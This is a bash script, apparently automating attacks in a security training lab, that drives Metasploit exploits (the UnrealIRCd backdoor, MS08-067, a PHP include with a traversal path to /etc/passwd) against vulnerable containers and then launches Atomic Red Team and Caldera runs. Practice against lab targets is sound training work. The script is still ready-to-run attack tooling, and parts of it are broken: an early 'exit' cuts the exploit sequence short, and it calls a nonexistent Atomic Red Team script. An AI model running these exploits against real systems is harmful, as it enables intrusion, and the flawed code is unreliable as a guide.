#!/bin/bash

echo "Running automated vulnerability exploits..."

# Start Metasploit in Kali container
docker exec -it kali msfconsole -q -x "
# Exploit 1: Metasploitable2 - UnrealIRCd Backdoor
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST metasploitable2
set RPORT 6667
exploit
sleep 5
exit

# Exploit 2: DVWA - SQL Injection (manual verification needed)
# Note: Access DVWA at http://localhost:8082 and test SQLi manually
echo 'DVWA SQL Injection: Test manually at http://localhost:8082' >> /root/exploit_log.txt

# Exploit 3: Windows XP - MS08-067 NetAPI
use exploit/windows/smb/ms08_067_netapi
set RHOST winxp
set RPORT 445
exploit
sleep 5
exit

# Exploit 4: Vulnerable Web App - Remote File Inclusion
use exploit/multi/http/php_include
set RHOST vuln_web
set RPORT 80
set PHPURI /index.php?page=../../../../etc/passwd
exploit
sleep 5
exit
"

# Run Atomic Red Team test
docker exec -it kali bash -c "
git clone https://github.com/redcanaryco/atomic-red-team.git /root/atomic-red-team
cd /root/atomic-red-team
./atomic-red-team.sh -t T1059.001 -e powershell
" >> /root/exploit_log.txt

# Run Caldera operation
docker exec -it caldera bash -c "
curl -X POST -H 'Content-Type: application/json' -d '{\"name\":\"TestOp\",\"adversary\":\"basic\"}' http://localhost:8888/api/v2/operations
" >> /root/exploit_log.txt

echo "Exploits completed. Logs saved to kali:/root/exploit_log.txt"